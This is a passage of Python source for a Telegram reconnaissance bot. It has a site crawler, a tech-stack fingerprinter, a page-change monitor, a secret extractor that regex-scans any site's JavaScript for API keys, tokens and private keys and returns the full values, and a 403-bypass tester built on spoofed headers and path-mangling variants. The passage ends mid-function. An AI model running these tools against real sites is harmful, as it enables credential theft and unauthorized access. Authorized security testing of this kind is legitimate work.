            with open(local,'w',encoding='utf-8',errors='replace') as f:
                f.write(html)
            stats['pages'] += 1
        except Exception:
            stats['failed'] += 1
            continue

        known_assets |= extract_assets(html, url)
        if full_site:
            for link in get_internal_links(html, url):
                if link not in visited:
                    queue.append(link)

        if stats['pages'] % 5 == 0:
            save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
                                   "assets":list(known_assets),"stats":stats})
        if progress_cb:
            bar = pbar(stats['pages'], max(len(visited), 1))
            progress_cb(
                f"📄 *Pages*\n`{bar}`\n"
                f"`{stats['pages']}` pages | `{len(known_assets)}` assets"
                + (" ⚡JS" if js_used else "")
            )

    # ── Phase 2: Assets ─────────────────────────
    asset_list   = [a for a in list(known_assets)[:max_assets] if a not in dl_done]
    total_assets = len(asset_list) + len(dl_done)
    extra_css    = set()
    max_bytes    = MAX_ASSET_MB * 1024 * 1024

    for i, asset_url in enumerate(asset_list):
        dl_done.add(asset_url)

        # SSRF check per asset
        safe_ok, reason = is_safe_url(asset_url)
        if not safe_ok:
            log_warn(asset_url, f"Asset SSRF blocked: {reason}")
            stats['failed'] += 1
            continue

        try:
            resp = session.get(asset_url, timeout=TIMEOUT, stream=True)
            resp.raise_for_status()

            # ── File size limit (DoS prevention) ──
            cl = resp.headers.get('Content-Length')
            if cl and int(cl) > max_bytes:
                log_warn(asset_url, f"Asset too large: {int(cl)//1024//1024}MB — skipped")
                stats['failed'] += 1
                continue

            content      = b''
            size_exceeded = False
            for chunk in resp.iter_content(8192):
                content += chunk
                if len(content) > max_bytes:
                    size_exceeded = True
                    break
            if size_exceeded:
                log_warn(asset_url, "Asset size limit exceeded mid-stream — skipped")
                stats['failed'] += 1
                continue

            local = safe_local_path(domain_dir, asset_url)
            with open(local,'wb') as f: f.write(content)
            stats['assets'] += 1
            stats['size_kb'] += len(content)/1024

            ct = resp.headers.get('Content-Type','')
            if 'css' in ct or asset_url.lower().endswith('.css'):
                extra_css |= extract_css_assets(content.decode('utf-8','replace'), asset_url)
            # ── Mine JS bundles for media URLs ────
            if 'javascript' in ct or asset_url.lower().endswith('.js'):
                js_media = extract_media_from_js(content.decode('utf-8','replace'), base_url)
                known_assets |= js_media

        except Exception as e:
            stats['failed'] += 1

        if i % 30 == 0:
            save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
                                   "assets":list(known_assets),"stats":stats})
        if progress_cb and i % 10 == 0:
            bar = pbar(len(dl_done), total_assets)
            progress_cb(
                f"📦 *Assets*\n`{bar}`\n"
                f"`{stats['assets']}` done | `{stats['size_kb']/1024:.1f}` MB"
            )

    # ── Phase 3: CSS nested assets ──────────────
    for asset_url in list(extra_css - dl_done)[:200]:
        safe_ok, _ = is_safe_url(asset_url)
        if not safe_ok: continue
        try:
            resp    = session.get(asset_url, timeout=TIMEOUT, stream=True)
            resp.raise_for_status()
            content = b''.join(resp.iter_content(8192))
            if len(content) > max_bytes: continue
            local   = safe_local_path(domain_dir, asset_url)
            with open(local,'wb') as f: f.write(content)
            stats['assets']  += 1
            stats['size_kb'] += len(content)/1024
        except Exception:
            stats['failed'] += 1

    # ── Phase 4: ZIP ─────────────────────────────
    if progress_cb: progress_cb("🗜️ ZIP ထုပ်နေပါတယ်...")

    zip_path = os.path.join(DOWNLOAD_DIR, f"{safe}.zip")
    with zipfile.ZipFile(zip_path,'w',zipfile.ZIP_DEFLATED) as zf:
        for root,dirs,files in os.walk(domain_dir):
            for file in files:
                fp = os.path.join(root,file)
                zf.write(fp, os.path.relpath(fp, DOWNLOAD_DIR))

    shutil.rmtree(domain_dir, ignore_errors=True)
    clear_resume(base_url)

    size_mb = os.path.getsize(zip_path)/1024/1024

    if needs_split(zip_path):
        if progress_cb: progress_cb(f"✂️ {size_mb:.1f}MB split လုပ်နေပါတယ်...")
        parts = split_zip(zip_path)
        os.remove(zip_path)
        return parts, None, stats, size_mb
    return [zip_path], None, stats, size_mb


# ══════════════════════════════════════════════════
# 🔬  FEATURE 1 — /tech  Tech Stack Fingerprinter
# ══════════════════════════════════════════════════

_TECH_SIGNATURES = {
    # CMS
    "WordPress":        [r'wp-content/', r'wp-includes/', r'wordpress'],
    "Drupal":           [r'Drupal\.settings', r'/sites/default/files/'],
    "Joomla":           [r'/media/joomla_', r'Joomla!'],
    "Ghost CMS":        [r'ghost\.io', r'/ghost/api/'],
    "Shopify":          [r'cdn\.shopify\.com', r'Shopify\.theme'],
    # JS Frameworks
    "Next.js":          [r'__NEXT_DATA__', r'/_next/static/'],
    "Nuxt.js":          [r'__NUXT__', r'/_nuxt/'],
    "React":            [r'__reactFiber', r'react-dom\.production'],
    "Vue.js":           [r'__vue__', r'data-v-[a-f0-9]+'],
    "Angular":          [r'ng-version=', r'angular\.min\.js'],
    "Svelte":           [r'__svelte', r'svelte-'],
    # Servers
    "Nginx":            [r'server:\s*nginx'],
    "Apache":           [r'server:\s*apache'],
    "Caddy":            [r'server:\s*caddy'],
    "LiteSpeed":        [r'server:\s*litespeed'],
    "IIS":              [r'server:\s*microsoft-iis'],
    # CDN / WAF
    "Cloudflare":       [r'cf-ray', r'server:\s*cloudflare'],
    "Akamai":           [r'x-akamai-request-id', r'akamai\.net'],
    "Fastly":           [r'x-fastly-request-id', r'fastly\.net'],
    "AWS CloudFront":   [r'x-amz-cf-id', r'cloudfront\.net'],
    # Analytics / Tag
    "Google Analytics": [r'google-analytics\.com/analytics\.js', r'gtag\('],
    "Google Tag Manager":[r'googletagmanager\.com/gtm\.js', r'GTM-[A-Z0-9]+'],
    "Hotjar":           [r'hotjar\.com', r'hj\(\'create\''],
    # Libraries
    "jQuery":           [r'jquery\.min\.js', r'jquery-[0-9]'],
    "Bootstrap":        [r'bootstrap\.min\.css', r'bootstrap\.min\.js'],
    "Tailwind":         [r'tailwindcss', r'class="[^"]*(?:flex|grid|text-[a-z]+-[0-9])'],
    # Backend
    "PHP":              [r'x-powered-by:\s*php', r'\.php'],
    "Laravel":          [r'laravel_session', r'x-powered-by:\s*php.*laravel'],
    "Django":           [r'csrfmiddlewaretoken', r'django'],
    "Rails":            [r'x-powered-by:\s*phusion passenger', r'_rails_'],
    "ASP.NET":          [r'x-powered-by:\s*asp\.net', r'__viewstate'],
    # DB / Backend hints
    "WordPress (WooCommerce)": [r'woocommerce', r'wc-api/'],
    "Stripe":           [r'stripe\.com/v3', r'Stripe\('],
    "Firebase":         [r'firebaseapp\.com', r'firebase\.initializeApp'],
    "Supabase":         [r'supabase\.co', r'supabaseClient'],
}

_NOTABLE_HEADERS = [
    'server', 'x-powered-by', 'x-generator', 'x-framework',
    'cf-ray', 'via', 'x-drupal-cache', 'x-varnish',
    'x-shopify-stage', 'x-wix-request-id',
]

async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/tech <url> — Detect technology stack"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/tech https://example.com`\n\n"
            "🔬 *Detects:*  CMS, JS frameworks, servers, CDN/WAF,\n"
            "analytics, backend tech, JS libraries & more.\n\n"
            f"Checks `{len(_TECH_SIGNATURES)}` known tech signatures.",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    msg = await update.effective_message.reply_text("🔬 Tech stack fingerprinting...")

    def _do_tech_scan():
        resp = requests.get(
            url, headers=_get_headers(), timeout=TIMEOUT, verify=False,
            proxies=proxy_manager.get_proxy(), allow_redirects=True
        )
        body         = resp.text[:80000]
        headers_str  = "\n".join(f"{k}: {v}" for k, v in resp.headers.items()).lower()
        combined     = (body + headers_str).lower()

        detected = {}
        for tech, patterns in _TECH_SIGNATURES.items():
            for p in patterns:
                if re.search(p, combined, re.I):
                    detected[tech] = p
                    break

        notable = {
            k: v for k, v in resp.headers.items()
            if k.lower() in _NOTABLE_HEADERS
        }
        return detected, notable, resp.status_code

    try:
        detected, notable, status = await asyncio.to_thread(_do_tech_scan)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname
    lines  = [f"🔬 *Tech Stack — `{domain}`*", f"Status: `{status}`\n"]

    # Group by category
    _CAT = {
        "CMS":        ["WordPress","Drupal","Joomla","Ghost CMS","Shopify","WordPress (WooCommerce)"],
        "JS Frameworks":["Next.js","Nuxt.js","React","Vue.js","Angular","Svelte"],
        "JS Libraries": ["jQuery","Bootstrap","Tailwind"],
        "Server":     ["Nginx","Apache","Caddy","LiteSpeed","IIS"],
        "CDN / WAF":  ["Cloudflare","Akamai","Fastly","AWS CloudFront"],
        "Analytics":  ["Google Analytics","Google Tag Manager","Hotjar"],
        "Backend":    ["PHP","Laravel","Django","Rails","ASP.NET"],
        "Services":   ["Stripe","Firebase","Supabase"],
    }

    any_found = False
    for cat, techs in _CAT.items():
        hits = [t for t in techs if t in detected]
        if hits:
            lines.append(f"*{cat}:*")
            for h in hits:
                lines.append(f"  ✅ `{h}`")
            lines.append("")
            any_found = True

    # Uncategorised
    known_all = {t for ts in _CAT.values() for t in ts}
    extras    = [t for t in detected if t not in known_all]
    if extras:
        lines.append("*Other:*")
        for t in extras:
            lines.append(f"  ✅ `{t}`")
        lines.append("")
        any_found = True

    if not any_found:
        lines.append("⚠️ No known tech signatures matched.")

    if notable:
        lines.append("*📋 Notable Headers:*")
        for k, v in list(notable.items())[:8]:
            lines.append(f"  `{k}: {v[:60]}`")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔔  FEATURE 3 — /monitor  Change Detection & Alerting
# ══════════════════════════════════════════════════
# DB structure: db["monitors"][str(uid)] = [{"url":..,"interval_min":..,"last_hash":..,"last_check":..,"label":..}]

_monitor_app_ref = None   # set in main() to access app.bot

async def monitor_loop():
    """Background task — check monitored URLs for content changes every 60s."""
    global _monitor_app_ref
    while True:
        try:
            await asyncio.sleep(60)
            async with db_lock:
                db = _load_db_sync()

            changed_alerts = []  # (uid, entry, new_hash)
            now = time.time()

            for uid_str, monitors in db.get("monitors", {}).items():
                for entry in monitors:
                    interval_sec = entry.get("interval_min", 30) * 60
                    if now - entry.get("last_check", 0) < interval_sec:
                        continue
                    try:
                        resp      = requests.get(
                            entry["url"], headers=_get_headers(),
                            timeout=TIMEOUT, verify=False,
                            proxies=proxy_manager.get_proxy()
                        )
                        new_hash  = hashlib.sha256(resp.text.encode()).hexdigest()
                        old_hash  = entry.get("last_hash", "")
                        entry["last_check"] = now

                        if old_hash and old_hash != new_hash:
                            changed_alerts.append((uid_str, entry, new_hash, resp.status_code))
                        entry["last_hash"] = new_hash
                    except Exception as ex:
                        logger.debug("Monitor check error %s: %s", entry.get("url"), ex)

            async with db_lock:
                _save_db_sync(db)

            # Fire alerts
            if _monitor_app_ref and changed_alerts:
                for uid_str, entry, new_hash, status in changed_alerts:
                    try:
                        label = entry.get("label") or entry["url"][:40]
                        await _monitor_app_ref.bot.send_message(
                            chat_id=int(uid_str),
                            text=(
                                f"🔔 *Page Changed!*\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"🏷 *{label}*\n"
                                f"🔗 `{entry['url'][:60]}`\n"
                                f"📡 Status: `{status}`\n"
                                f"🕑 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
                                f"Old: `{entry.get('last_hash','?')[:16]}…`\n"
                                f"New: `{new_hash[:16]}…`\n\n"
                                f"_Use /monitor list to manage alerts_"
                            ),
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.warning("Monitor alert send error: %s", e)

        except Exception as e:
            logger.error("Monitor loop error: %s", e)
            await asyncio.sleep(30)


async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/monitor add <url> [interval_min] [label] | list | del <n> | clear"""
    uid  = str(update.effective_user.id)
    args = context.args or []
    sub  = args[0].lower() if args else ""

    if not sub or sub == "help":
        await update.effective_message.reply_text(
            "🔔 *Page Monitor — Usage*\n\n"
            "`/monitor add <url> [interval] [label]`\n"
            "  └ interval = minutes (default 30, min 5)\n"
            "  └ label = custom name (optional)\n\n"
            "`/monitor list` — View all monitors\n"
            "`/monitor del <n>` — Remove by number\n"
            "`/monitor clear` — Remove all\n\n"
            "📣 Bot ကို alert ပို့ပေးမယ် page ပြောင်းတိုင်း",
            parse_mode='Markdown'
        )
        return

    async with db_lock:
        db = _load_db_sync()
        if "monitors" not in db:
            db["monitors"] = {}
        monitors = db["monitors"].setdefault(uid, [])

        if sub == "add":
            if len(args) < 2:
                await update.effective_message.reply_text("Usage: `/monitor add <url> [interval_min] [label]`", parse_mode='Markdown')
                _save_db_sync(db)
                return
            url   = args[1].strip()
            if not url.startswith('http'):
                url = 'https://' + url
            safe_ok, reason = is_safe_url(url)
            if not safe_ok:
                await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
                _save_db_sync(db)
                return
            interval = max(5, int(args[2])) if len(args) > 2 and args[2].isdigit() else 30
            label    = " ".join(args[3:])[:40] if len(args) > 3 else urlparse(url).hostname
            if len(monitors) >= 10:
                await update.effective_message.reply_text("⚠️ Max 10 monitors per user.", parse_mode='Markdown')
                _save_db_sync(db)
                return
            monitors.append({
                "url": url, "label": label,
                "interval_min": interval,
                "last_hash": "", "last_check": 0,
                "added": datetime.now().strftime("%Y-%m-%d %H:%M")
            })
            _save_db_sync(db)
            await update.effective_message.reply_text(
                f"✅ *Monitor Added*\n"
                f"🏷 `{label}`\n🔗 `{url[:60]}`\n⏱ Every `{interval}` min",
                parse_mode='Markdown'
            )

        elif sub == "list":
            _save_db_sync(db)
            if not monitors:
                await update.effective_message.reply_text("📭 No monitors set up yet.")
                return
            lines = ["🔔 *Your Monitors*\n"]
            for i, m in enumerate(monitors, 1):
                lines.append(
                    f"*{i}.* `{m.get('label', m['url'][:30])}`\n"
                    f"   🔗 `{m['url'][:50]}`\n"
                    f"   ⏱ Every `{m['interval_min']}` min | Added `{m.get('added','?')}`"
                )
            await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')

        elif sub == "del":
            idx = int(args[1]) - 1 if len(args) > 1 and args[1].isdigit() else -1
            if 0 <= idx < len(monitors):
                removed = monitors.pop(idx)
                _save_db_sync(db)
                await update.effective_message.reply_text(
                    f"🗑 Removed: `{removed.get('label', removed['url'][:40])}`",
                    parse_mode='Markdown'
                )
            else:
                _save_db_sync(db)
                await update.effective_message.reply_text("❌ Invalid number. Use `/monitor list` to see indexes.", parse_mode='Markdown')

        elif sub == "clear":
            monitors.clear()
            _save_db_sync(db)
            await update.effective_message.reply_text("🗑 All monitors cleared.")

        else:
            _save_db_sync(db)
            await update.effective_message.reply_text("❓ Unknown subcommand. Use `/monitor help`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔑  FEATURE 7 — /extract  Secret & Sensitive Data Extractor
# ══════════════════════════════════════════════════

_SECRET_PATTERNS = {
    "AWS Access Key":    (r'AKIA[0-9A-Z]{16}',                              "🔴"),
    "AWS Secret":        (r'(?i)aws.{0,20}secret.{0,20}[0-9a-zA-Z/+]{40}', "🔴"),
    "Stripe Secret":     (r'sk_live_[0-9a-zA-Z]{24,}',                     "🔴"),
    "Stripe Public":     (r'pk_live_[0-9a-zA-Z]{24,}',                     "🟡"),
    "JWT Token":         (r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', "🔴"),
    "Google API Key":    (r'AIza[0-9A-Za-z_-]{35}',                        "🔴"),
    "Firebase Config":   (r'"apiKey"\s*:\s*"AIza[0-9A-Za-z_-]{35}"',       "🔴"),
    "Private Key Block": (r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',      "🔴"),
    "GitHub Token":      (r'ghp_[0-9a-zA-Z]{36}',                          "🔴"),
    "GitLab Token":      (r'glpat-[0-9a-zA-Z_-]{20}',                      "🔴"),
    "Slack Token":       (r'xox[baprs]-[0-9a-zA-Z\-]+',                    "🔴"),
    "Bearer Token":      (r'(?i)bearer\s+[a-zA-Z0-9_\-\.]{20,}',           "🟠"),
    "Basic Auth Header": (r'(?i)authorization:\s*basic\s+[A-Za-z0-9+/=]{8,}',"🟠"),
    "MongoDB URI":       (r'mongodb(?:\+srv)?://[^\s"\'<>]{10,}',           "🔴"),
    "MySQL DSN":         (r'mysql://[^\s"\'<>]{10,}',                       "🔴"),
    "Generic Password":  (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\'][^"\']{8,}["\']', "🟠"),
    "Telegram Token":    (r'\d{8,10}:AA[0-9a-zA-Z_-]{33}',                 "🔴"),
    "Sendgrid Key":      (r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}',    "🔴"),
    "Twilio Key":        (r'SK[0-9a-fA-F]{32}',                             "🟠"),
    "HuggingFace Token": (r'hf_[a-zA-Z]{34}',                              "🟡"),
    "OpenAI Key":        (r'sk-[a-zA-Z0-9]{48}',                           "🔴"),
}

async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/extract <url> — Scan HTML + JS for secrets, always exports ZIP with all sources"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/extract https://example.com`\n\n"
            "🔑 Scans HTML source + all external/inline JS files for:\n"
            "AWS keys, Stripe, JWT, GitHub tokens, Firebase configs,\n"
            "private keys, MongoDB URIs, passwords & more.\n\n"
            f"Checks `{len(_SECRET_PATTERNS)}` secret patterns across all JS bundles.\n\n"
            "📦 *Always exports a ZIP* containing:\n"
            "  • `index.html` — raw HTML source\n"
            "  • `js/` folder — all external JS files\n"
            "  • `inline_scripts/` — all inline `<script>` blocks\n"
            "  • `report.json` — full findings report\n"
            "  • `report.txt` — human-readable summary\n\n"
            "⚠️ _For authorized security research only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname

    msg = await update.effective_message.reply_text(
        f"🔑 Scanning `{domain}`...\n\n"
        "⬇️ Phase 1: Fetching HTML source\n"
        "📦 Phase 2: Downloading JS bundles\n"
        "🔍 Phase 3: Pattern matching\n"
        "🗜️ Phase 4: Building ZIP\n\n⏳",
        parse_mode='Markdown'
    )

    def _do_extract():
        session   = requests.Session()
        session.headers.update(_get_headers())

        resp = session.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)
        soup = BeautifulSoup(resp.text, 'html.parser')

        # ── Build source map ──────────────────────────────
        # sources = { filename_in_zip : content_str }
        sources        = {}
        source_origins = {}   # filename → original URL or tag info
        inline_idx     = 0
        js_idx         = 0

        # 1. Main HTML
        sources["index.html"]        = resp.text
        source_origins["index.html"] = url

        # 2. External JS + inline scripts
        for script in soup.find_all('script'):
            src = script.get('src')
            if src:
                js_url    = urljoin(url, src) if not src.startswith('http') else src
                js_safe, _ = is_safe_url(js_url)
                if not js_safe:
                    continue
                try:
                    jr = session.get(js_url, timeout=12, verify=False)
                    if jr.status_code == 200 and jr.text.strip():
                        # Make a safe filename from the URL path
                        raw_name = src.split('/')[-1].split('?')[0][:60] or f"script_{js_idx}.js"
                        # Ensure .js extension
                        if not raw_name.endswith('.js'):
                            raw_name += '.js'
                        safe_name = re.sub(r'[^\w\.\-]', '_', raw_name)
                        fname     = f"js/{js_idx:03d}_{safe_name}"
                        sources[fname]        = jr.text
                        source_origins[fname] = js_url
                        js_idx += 1
                except Exception:
                    pass
            elif script.string and script.string.strip():
                content_str = script.string.strip()
                fname       = f"inline_scripts/inline_{inline_idx:03d}.js"
                sources[fname]        = content_str[:200000]   # cap at 200KB per inline
                source_origins[fname] = f"<script> tag #{inline_idx} on {url}"
                inline_idx += 1

        # ── Scan all sources ──────────────────────────────
        findings  = []
        seen_keys = set()

        for fname, content in sources.items():
            file_findings = []
            for stype, (pattern, risk) in _SECRET_PATTERNS.items():
                for match in re.finditer(pattern, content):
                    val = match.group(0)
                    # Store FULL value in findings (goes into ZIP report, not Telegram message)
                    dedup_key = stype + val[:40]
                    if dedup_key in seen_keys:
                        continue
                    seen_keys.add(dedup_key)
                    # Redacted copy for Telegram display
                    if len(val) > 16:
                        redacted = val[:8] + "…" + val[-4:]
                    else:
                        redacted = val[:6] + "…"
                    file_findings.append({
                        "type":     stype,
                        "risk":     risk,
                        "value_redacted": redacted,
                        "value_full":     val,       # full value stored in ZIP only
                        "file":     fname,
                        "origin":   source_origins.get(fname, ""),
                        "line":     content[:match.start()].count('\n') + 1,
                    })
            findings.extend(file_findings)

        return sources, source_origins, findings

    try:
        sources, source_origins, findings = await asyncio.to_thread(_do_extract)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{type(e).__name__}: {str(e)[:80]}`", parse_mode='Markdown')
        return

    # ── Sort findings by risk ────────────────────────────
    risk_order = {"🔴": 0, "🟠": 1, "🟡": 2}
    findings.sort(key=lambda x: risk_order.get(x["risk"], 9))

    critical = sum(1 for f in findings if f["risk"] == "🔴")
    high     = sum(1 for f in findings if f["risk"] == "🟠")
    med      = sum(1 for f in findings if f["risk"] == "🟡")

    # ── Build report.txt (human readable, full values) ──
    txt_lines = [
        f"=" * 60,
        f"  EXTRACT REPORT — {domain}",
        f"  Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M')}",
        f"  URL: {url}",
        f"=" * 60,
        f"",
        f"SUMMARY",
        f"-------",
        f"Sources scanned : {len(sources)} files",
        f"Patterns checked: {len(_SECRET_PATTERNS)}",
        f"Findings total  : {len(findings)}",
        f"  Critical (🔴) : {critical}",
        f"  High     (🟠) : {high}",
        f"  Medium   (🟡) : {med}",
        f"",
        f"FILES SCANNED",
        f"-------------",
    ]
    for fname, origin in source_origins.items():
        size_kb = len(sources[fname].encode('utf-8', errors='replace')) / 1024
        txt_lines.append(f"  [{size_kb:6.1f} KB]  {fname}  ←  {origin[:80]}")

    txt_lines += ["", "FINDINGS", "--------"]
    if findings:
        for i, f in enumerate(findings, 1):
            txt_lines += [
                f"",
                f"[{i:03d}] {f['risk']} {f['type']}",
                f"  File  : {f['file']}",
                f"  Line  : {f['line']}",
                f"  Origin: {f['origin'][:80]}",
                f"  Value : {f['value_full']}",    # ← FULL value in ZIP file
            ]
    else:
        txt_lines.append("  No secrets found.")

    txt_lines += [
        "",
        "=" * 60,
        "  ⚠  This report contains unredacted values.",
        "  For authorized security research only.",
        "=" * 60,
    ]
    report_txt = "\n".join(txt_lines)

    # ── Build report.json ────────────────────────────────
    report_json = json.dumps({
        "domain":          domain,
        "url":             url,
        "scanned_at":      datetime.now().isoformat(),
        "files_scanned":   list(source_origins.values()),
        "pattern_count":   len(_SECRET_PATTERNS),
        "findings_count":  len(findings),
        "summary":         {"critical": critical, "high": high, "medium": med},
        "findings": [{
            "type":   f["type"],
            "risk":   f["risk"],
            "value":  f["value_full"],
            "file":   f["file"],
            "line":   f["line"],
            "origin": f["origin"],
        } for f in findings],
        "files": {fname: source_origins[fname] for fname in sources},
    }, ensure_ascii=False, indent=2)

    # ── Build ZIP in memory ──────────────────────────────
    await msg.edit_text(
        f"🗜️ Building ZIP for `{domain}`...\n"
        f"📂 `{len(sources)}` source files + reports",
        parse_mode='Markdown'
    )

    import io
    zip_buffer = io.BytesIO()
    safe_domain = re.sub(r'[^\w\-]', '_', domain)
    ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_name    = f"extract_{safe_domain}_{ts}.zip"

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Source files
        for fname, content in sources.items():
            zf.writestr(f"sources/{fname}", content.encode('utf-8', errors='replace'))
        # Reports
        zf.writestr("report.txt",  report_txt.encode('utf-8'))
        zf.writestr("report.json", report_json.encode('utf-8'))
        # README
        _js_count     = sum(1 for f in sources if f.startswith("js/"))
        _inline_count = sum(1 for f in sources if f.startswith("inline_scripts/"))
        readme = (
            f"EXTRACT SCAN — {domain}\n"
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"CONTENTS\n"
            f"  sources/index.html           — Raw HTML page\n"
            f"  sources/js/                  — External JS files ({_js_count} files)\n"
            f"  sources/inline_scripts/      — Inline <script> blocks ({_inline_count} blocks)\n"
            f"  report.txt                   — Human-readable findings (FULL values)\n"
            f"  report.json                  — Machine-readable JSON report\n\n"
            f"FINDINGS: {len(findings)} total  "
            f"(Critical:{critical} High:{high} Medium:{med})\n"
        )
        zf.writestr("README.txt", readme.encode('utf-8'))

    zip_buffer.seek(0)
    zip_size_mb = zip_buffer.getbuffer().nbytes / 1024 / 1024

    # ── Send Telegram summary (redacted) ────────────────
    if findings:
        tg_lines = [
            f"🚨 *{len(findings)} Secret(s) Found — `{domain}`*",
            f"🔴 Critical: `{critical}` | 🟠 High: `{high}` | 🟡 Medium: `{med}`",
            f"📂 Scanned: `{len(sources)}` files\n",
        ]
        for f in findings[:15]:
            tg_lines.append(
                f"{f['risk']} *{f['type']}*\n"
                f"   Value: `{f['value_redacted']}`\n"
                f"   File:  `{f['file']}`  Line `{f['line']}`"
            )
        if len(findings) > 15:
            tg_lines.append(f"\n_…and {len(findings)-15} more — see ZIP report_")
        tg_lines.append("\n⚠️ _Telegram: values redacted. Full values in ZIP report._")
    else:
        tg_lines = [
            f"✅ *No Secrets Found*",
            f"🔗 `{domain}`",
            f"📂 Sources scanned: `{len(sources)}` files",
            f"🔍 Patterns checked: `{len(_SECRET_PATTERNS)}`",
            f"\n_ZIP contains all raw source files for manual review._",
        ]

    tg_text = "\n".join(tg_lines)
    try:
        if len(tg_text) > 4000:
            await msg.edit_text(tg_text[:4000], parse_mode='Markdown')
        else:
            await msg.edit_text(tg_text, parse_mode='Markdown')
    except Exception:
        pass

    # ── Send ZIP ─────────────────────────────────────────
    cap = (
        f"📦 *Extract ZIP — `{domain}`*\n"
        f"🔍 `{len(sources)}` source files | `{len(findings)}` findings\n"
        f"🔴`{critical}` 🟠`{high}` 🟡`{med}` | 💾 `{zip_size_mb:.2f} MB`\n\n"
        f"📄 `report.txt` — full unredacted values\n"
        f"📋 `report.json` — machine-readable\n"
        f"📁 `sources/` — raw HTML + JS files"
    )
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=zip_buffer,
            filename=zip_name,
            caption=cap,
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"❌ ZIP send error: `{type(e).__name__}: {str(e)[:60]}`",
            parse_mode='Markdown'
        )



# ══════════════════════════════════════════════════
# 🔓  /bypass403 — 403 Forbidden Bypass Tester
# ══════════════════════════════════════════════════

_BYPASS_HEADERS = [
    {"X-Original-URL":             "{path}"},
    {"X-Rewrite-URL":              "{path}"},
    {"X-Custom-IP-Authorization":  "127.0.0.1"},
    {"X-Forwarded-For":            "127.0.0.1"},
    {"X-Forwarded-For":            "localhost"},
    {"X-Remote-IP":                "127.0.0.1"},
    {"X-Remote-Addr":              "127.0.0.1"},
    {"X-Host":                     "localhost"},
    {"X-Real-IP":                  "127.0.0.1"},
    {"X-ProxyUser-Ip":             "127.0.0.1"},
    {"Referer":                    "{url}"},
    {"X-Originating-IP":           "127.0.0.1"},
    {"True-Client-IP":             "127.0.0.1"},
    {"Client-IP":                  "127.0.0.1"},
    {"CF-Connecting-IP":           "127.0.0.1"},
    {"Forwarded":                  "for=127.0.0.1"},
    {"X-Frame-Options":            "Allow"},
    {"X-WAF-Bypass":               "1"},
    {"X-Bypass":                   "1"},
    {"Authorization":              "Bearer null"},
]

_BYPASS_PATH_VARIANTS = [
    "{path}",
    "{path}/",
    "{path}//",
    "{path}/.",
    "{path}/..",
    "/{path_no_slash}%20",
    "/{path_no_slash}%09",
    "/{path_no_slash}%00",
    "/{path_no_slash}..;/",
    "/{path_no_slash};/",
    "/{path_no_slash}?",
    "//{path_no_slash}",
    "/{path_upper}",
    "/{path_lower}",
    "{path_dot_slash}",
]

_BYPASS_METHODS = ["POST", "PUT", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]

def _bypass_sync(url: str) -> list:
    """Run all 403 bypass techniques against a URL."""
    parsed     = urlparse(url)
    path       = parsed.path or "/"
    path_clean = path.lstrip("/")
    base       = f"{parsed.scheme}://{parsed.netloc}"
    results    = []


    def _probe(test_url: str, extra_headers: dict = None, method: str = "GET",
               label: str = "") -> dict | None:
        try:
            h = dict(_get_headers())
            if extra_headers:
                # Resolve {path} / {url} placeholders in header values
                for k, v in extra_headers.items():
                    v = v.replace("{path}", path).replace("{url}", url)
                    h[k] = v
            r = requests.request(
                method, test_url, headers=h,
                timeout=8, verify=False,
                allow_redirects=False,
                proxies=proxy_manager.get_proxy()
            )
            return {
                "url":    test_url,
                "method": method,
                "status": r.status_code,
                "size":   len(r.content),
                "label":  label,
                "headers": dict(r.headers),
            }
        except Exception:
            return None

    # ── Baseline: confirm it's actually 403 ────────
    baseline = _probe(url, label="baseline")
    if not baseline:
        return []
    results.append({**baseline, "technique": "Baseline"})
    baseline_status = baseline["status"]
    baseline_size   = baseline["size"]

    def _is_bypass(r: dict) -> bool:
        if not r:
            return False
        st = r["status"]
        # Success: 200/201/204/301/302 when baseline was 403/401
        if baseline_status in (403, 401):
